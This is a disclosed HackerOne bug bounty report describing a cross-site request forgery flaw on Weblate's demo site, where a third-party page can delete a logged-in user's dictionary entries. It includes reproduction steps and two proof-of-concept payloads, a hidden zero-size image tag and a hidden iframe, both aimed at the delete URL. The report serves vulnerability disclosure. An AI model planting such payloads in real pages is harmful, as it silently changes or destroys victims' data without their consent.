# CSRF bypass ( Delate Source Translation From dictionaries ) in demo.weblate.org

## Report Details
- **Report ID**: 230863
- **URL**: https://hackerone.com/reports/230863
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-05-22T18:58:20.622Z
- **Disclosed**: 2017-06-02T12:15:23.964Z

## Reporter
- **Username**: sup3r-b0y
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: weblate

## Vulnerability Information
Hello

I've Found CSRF in  https://demo.weblate.org
Sending a POST request  dictionaries  will delate successfully

steps to reproduce:

1.  go https://demo.weblate.org/ and login into your account
2.  now go https://demo.weblate.org/dictionaries/hello/sl/ 
3. add  new word, now delate it by CSRF

i made two exploit for attack

POC:

<img src="https://demo.weblate.org/delete-dictionaries/hello/sl/5545/" width=0 height=0>


POC:

<!DOCTYPE html>
<html>
<body>
<iframe src="https://demo.weblate.org/delete-dictionaries/hello/sl/5545/" style="display:none;">
</iframe>
</body>
</html>

Just replace the delate id,  and try to delate

if you need more info please let me know!

be safe 

Thanks

## Attachments
- Screenshot_489.png
- Screenshot_490.png
